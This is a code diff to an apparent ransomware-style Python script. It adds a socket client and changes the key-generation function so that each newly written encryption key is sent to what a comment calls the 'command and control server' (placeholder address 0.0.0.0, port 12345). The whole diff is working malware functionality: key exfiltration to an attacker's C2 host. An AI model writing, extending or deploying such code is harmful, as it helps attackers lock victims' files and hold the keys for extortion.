@@ -36,6 +36,33 @@ keyfilePath = "key.txt"
 
 #===========================#
 
+def connect_to_server(host='127.0.0.1', port=12345, message="Hello!"):
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+    
+        try:
+    
+            # Connect to the server
+            client_socket.connect((host, port))
+            
+            print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Connected to [{bcolors.WARNING}{host}:{port}{bcolors.ENDC}]")
+            
+            # Send the message
+            client_socket.sendall(message.encode('utf-8'))
+            
+            print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] Sent: [{bcolors.OKCYAN}{message}{bcolors.ENDC}]")
+            
+            # Close the connection
+            client_socket.close()
+            
+            print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] Connection closed.")
+
+        except Exception as e:
+        
+            print(f"| [{bcolors.WARNING}x{bcolors.ENDC}] Error: {e}")
+
+#===========================#
+
 # Generates encryption key in file <filename>
 def generate_key():
 
@@ -43,6 +70,11 @@ def generate_key():
     
     with open(keyfilePath, "wb") as filekey:
         filekey.write(key)
+    
+    # Exfiltrate the key to the command and control server
+    cncIP = "0.0.0.0"
+    cncPort = 12345
+    connect_to_server(cncIP, cncPort, key)
 
 #===========================#
 
